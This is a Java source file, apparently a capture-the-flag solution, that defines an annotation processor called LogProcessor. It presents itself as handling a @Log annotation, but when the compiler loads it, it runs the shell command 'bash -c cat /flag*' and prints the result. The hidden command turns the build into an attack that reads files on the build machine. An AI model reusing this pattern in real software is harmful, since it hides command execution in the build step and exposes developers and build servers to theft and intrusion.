package com.h4ck1t.ctf.annotationprocessor.log;

import java.util.Set;
import java.lang.Runtime;
import java.lang.Process;
import java.lang.StringBuilder;
import java.lang.ProcessBuilder;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import javax.tools.Diagnostic;
import javax.annotation.processing.RoundEnvironment;
import javax.annotation.processing.AbstractProcessor;
import javax.annotation.processing.SupportedAnnotationTypes;
import javax.lang.model.element.Element;
import javax.lang.model.element.TypeElement;

@SupportedAnnotationTypes("com.h4ck1t.ctf.annotationprocessor.log.Log")
public class LogProcessor extends AbstractProcessor {

  @Override
  public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
    try {
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("bash", "-c", "cat /flag*");
        Process process = processBuilder.start();
        StringBuilder output = new StringBuilder();
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line);
            output.append("\n");
        }
        int exitVal = process.waitFor();
        if (exitVal == 0) {
            System.out.println("Success!");
        }
        System.out.println(output);
    } catch (IOException e) {
        System.out.println(e.toString());
    } catch (InterruptedException e) {
        System.out.println(e.toString());
    }
    for ( TypeElement annotation : annotations ) {
      for ( Element element : roundEnv.getElementsAnnotatedWith(annotation) ) {
        processingEnv.getMessager().printMessage(Diagnostic.Kind.NOTE, "found @Log at " + element);
      }
    }
    return true;
  }

}
